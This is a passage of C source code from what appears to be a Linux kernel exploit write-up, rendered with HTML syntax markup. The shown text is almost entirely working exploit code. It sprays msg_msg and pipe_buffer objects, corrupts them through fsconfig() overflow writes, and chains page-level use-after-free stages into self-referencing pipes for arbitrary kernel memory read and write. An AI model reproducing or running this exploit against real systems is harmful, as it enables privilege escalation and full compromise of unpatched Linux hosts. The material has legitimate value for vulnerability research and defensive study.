MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    puts(&quot;\n[*] Spray seq_operations...&quot;);</span><br><span class="hljs-comment">    for (int i = 0; i &lt; SEQ_SPRAY_NR; i++) &#123;</span><br><span class="hljs-comment">        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0) &#123;</span><br><span class="hljs-comment">            printf(&quot;[x] Failed at creating %d seq_file.\n&quot;, i);</span><br><span class="hljs-comment">            err_exit(&quot;FAILED to create seq_file!&quot;);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;1919810ARTTNBA114514&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to overwrite the msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\xc8\x1f&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Tring to make an oob read...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> read_size;<br><br>        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (read_size &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (read_size &gt; MSG_SZ) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim msg_msg at \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;%d\033[32m\033[1m msg_queue!\033[0m\n&quot;</span>, i);<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qidx == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to overwrite the header of msg_msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = MSG_SZ / 8; i &lt; (OOB_READ_SZ / 8); i++) &#123;</span><br><span class="hljs-comment">        if (buf[i] &gt; 0xffffffff81000000 &amp;&amp; ((buf[i] &amp; 0xfff) == 0x4d0)) &#123;</span><br><span class="hljs-comment">            printf(&quot;[*] Leak kernel text addr: %lx\n&quot;, buf[i]);</span><br><span class="hljs-comment">            ktext_leak = buf[i];</span><br><span class="hljs-comment">            break;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if (ktext_leak == -1) &#123;</span><br><span class="hljs-comment">        err_exit(&quot;FAILED to leak kernel text address!&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    kernel_offset = ktext_leak - 0xffffffff813834d0;</span><br><span class="hljs-comment">    kernel_base += kernel_offset;</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;, kernel_base);</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;, kernel_offset);</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> orig_pid, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x8000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>        <span class="hljs-string">&quot;Stage II - corrupting pipe_buffer to make two pipes point to same page&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating 4k pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to release msg_msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at extending %d pipe_buffer.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe_buffer!&quot;</span>);<br>        &#125;<br><br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);  <span class="hljs-comment">/* prevent pipe_release() */</span><br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting pipe_buffer-&gt;page...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;tt&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) / <span class="hljs-number">16</span>); i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;ratbant&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking for pipe&#x27;s corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (PIPE_SPRAY_NR - <span class="hljs-number">1</span>); i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = i;<br>            victim_pid = nr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully corrupt pipe_buffer! &quot;</span><br>           <span class="hljs-string">&quot;orig_pid: \033[0m%d, \033[32m\033[1mvictim pipe: \033[0m%d\n&quot;</span>,<br>           orig_pid, victim_pid);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], pipe_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage III - corrupting second-level pipe_buffer to exploit a &quot;</span><br>         <span class="hljs-string">&quot;page-level UAF&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">40</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* I don&#x27;t know why but sometimes the read will be strange :( */</span><br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">4</span>] == <span class="hljs-number">0xffffffff</span>) &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, &amp;((<span class="hljs-type">char</span>*)pipe_buf)[<span class="hljs-number">12</span>], <span class="hljs-number">40</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, pipe_buf, <span class="hljs-number">40</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;offset: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;len: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;flags: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;private: \033[0m%lx\n&quot;</span>, <br>           info_pipe_buf.page, <br>           info_pipe_buf.offset, <br>           info_pipe_buf.len, <br>           info_pipe_buf.ops, <br>           info_pipe_buf.flags,<br>           info_pipe_buf.private);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    <span class="hljs-comment">//info_pipe_buf.offset = 8;</span><br>    <span class="hljs-comment">//info_pipe_buf.len = 0xf00;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">35</span>; i++) &#123;<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>],buf,SND_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">char</span> tmp_bf[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0x74747261</span>) &#123;<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], tmp_bf, <span class="hljs-number">4</span>);<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] nr for %d pipe is %d\n&quot;</span>, i, nr);<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NR &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage IV - Building a self-writing pipe system&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, 